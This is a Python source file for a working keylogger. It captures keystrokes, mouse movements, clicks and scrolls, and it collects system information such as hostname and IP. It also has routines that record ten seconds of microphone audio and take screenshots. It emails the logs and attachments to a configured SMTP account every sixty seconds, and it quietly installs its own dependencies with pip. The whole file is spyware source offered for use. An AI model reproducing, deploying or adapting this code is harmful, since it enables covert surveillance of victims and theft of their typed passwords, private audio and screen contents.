import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard, mouse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

try:
    from pynput.keyboard import Listener as KeyboardListener
    from pynput.mouse import Listener as MouseListener
except ImportError:
    from subprocess import call
    modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(modules), shell=True)
    from pynput.keyboard import Listener as KeyboardListener
    from pynput.mouse import Listener as MouseListener

EMAIL_ADDRESS = "YOUR_USERNAME"
EMAIL_PASSWORD = "YOUR_PASSWORD"
SEND_REPORT_EVERY = 60  # in seconds

# Configure logging to a file and console
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    logging.FileHandler("keylogger.log"),
    logging.StreamHandler()
])

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        logging.debug("KeyLogger initialized.")

    def append_log(self, string):
        self.log += string
        logging.debug(f"Appended to log: {string}")

    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}"
        self.append_log(current_move + "\n")
        logging.info(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = f"Mouse {'pressed' if pressed else 'released'} at {x}, {y} with {button}"
        self.append_log(current_click + "\n")
        logging.info(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y} with delta {dx}, {dy}"
        self.append_log(current_scroll + "\n")
        logging.info(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = "SPACE"
            elif key == keyboard.Key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key + "\n")
        logging.info(f"Key pressed: {current_key}")

    def send_mail(self, email, password, message, attachment=None):
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = "Keylogger Report"

        msg.attach(MIMEText(message, 'plain'))

        if attachment:
            with open(attachment, 'rb') as f:
                mime = MIMEBase('application', 'octet-stream')
                mime.set_payload(f.read())
                encoders.encode_base64(mime)
                mime.add_header('Content-Disposition', 'attachment', filename=os.path.basename(attachment))
                msg.attach(mime)

        try:
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.send_message(msg)
            logging.info("Email sent successfully.")
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def report(self):
        logging.debug("Sending report...")
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        sys_info = f"""
        Hostname: {hostname}
        IP Address: {ip}
        Processor: {plat}
        System: {system}
        Machine: {machine}
        """
        self.append_log(sys_info + "\n")
        logging.info("System information gathered.")

    def microphone(self):
        fs = 44100
        seconds = 10  # Record for 10 seconds
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        wavefile = wave.open("sound.wav", 'wb')
        wavefile.setnchannels(2)
        wavefile.setsampwidth(2)
        wavefile.setframerate(fs)
        wavefile.writeframes(myrecording.tobytes())
        wavefile.close()
        self.send_mail(self.email, self.password, "Microphone recording attached", "sound.wav")
        logging.info("Microphone recording saved and emailed.")

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save("screenshot.png")
        self.send_mail(self.email, self.password, "Screenshot attached", "screenshot.png")
        logging.info("Screenshot taken and emailed.")

    def run(self):
        logging.info("Keylogger is running...")
        self.system_information()
        self.report()

        with KeyboardListener(on_press=self.save_data) as keyboard_listener, MouseListener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            keyboard_listener.join()
            mouse_listener.join()

if __name__ == "__main__":
    logging.info("Starting KeyLogger...")
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
